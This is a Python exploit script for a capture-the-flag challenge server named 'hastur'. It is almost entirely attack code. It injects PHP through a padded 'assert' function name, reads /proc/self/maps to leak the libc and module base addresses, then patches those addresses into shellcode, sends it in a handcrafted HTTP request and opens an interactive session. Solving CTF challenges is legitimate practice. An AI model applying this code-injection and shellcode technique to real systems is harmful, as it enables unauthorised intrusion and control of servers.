#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib
import requests
import urllib

ADDR = "hastur.chal.ctf.westerns.tokyo"
PORT = 31178

DBG = True

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

# leak through proc/maps
func = ""
func = func.ljust(32, "_")
func += "assert"

data = '($x = function() { print("PWNOUTPUT"); printf(file_get_contents("/proc/self/maps")); print("PWNOUTPUT"); return 1; }) and $x() '

r = requests.post("http://" + ADDR + ":" + str(PORT), data = {"name": func, "text": data})
maps = r.text.split("PWNOUTPUT")[-2]
maps = maps.split("\n")
for line in maps:
    if "libc-2.19.so" in line and "r-xp" in line:
        lc_base = int(line.split("-")[0], 16)
    elif "hastur.so" in line and "r-xp" in line:
        hastur_base = int(line.split("-")[0], 16)
    elif "mod_flag.so" in line and "r-xp" in line:
        mod_flag_base = int(line.split("-")[0], 16)

print "libc at: %s"%hex(lc_base)
print "hastur.so at: %s"%hex(hastur_base)
print "mod_flag.so at: %s"%hex(mod_flag_base)

# here we can't user requests because 
# the server will be corrupted at the time
# and if we don't send back a proper header
# it will complain

func = ""
func = func.ljust(32, "_")
func += "assert"
param = sys.argv[1]

param = open(param, "r").read().replace("\n", "")
param = param.replace("HASTURBASE", hex(hastur_base))
param = param.replace("LIBCBASE", hex(lc_base))
sc = open("sc.bin", "r").read()
sc = sc.replace("ZZZZ", p32(mod_flag_base + 0x2080 - 1))
sc = repr(sc)
sc = "\"" + sc[1:-1] + "\""
param = param.replace("SHELLCODE", sc)
data = '($x = function() { %s; return 1; }) and $x() '%(param)

body = "text=" + urllib.quote(data, safe='') + "&name=" + func

header = """POST / HTTP/1.1
Host: hastur.chal.ctf.westerns.tokyo:31178
Connection: keep-alive
Accept-Encoding: text
Accept: */*
User-Agent: python-requests/2.10.0
Content-Length: %d
Content-Type: application/x-www-form-urlencoded"""%(len(body))

req = header + "\r\n\r\n"
req += body + "\r\n\r\n"

s.send(req)

t = telnetlib.Telnet()
t.sock = s
t.interact()
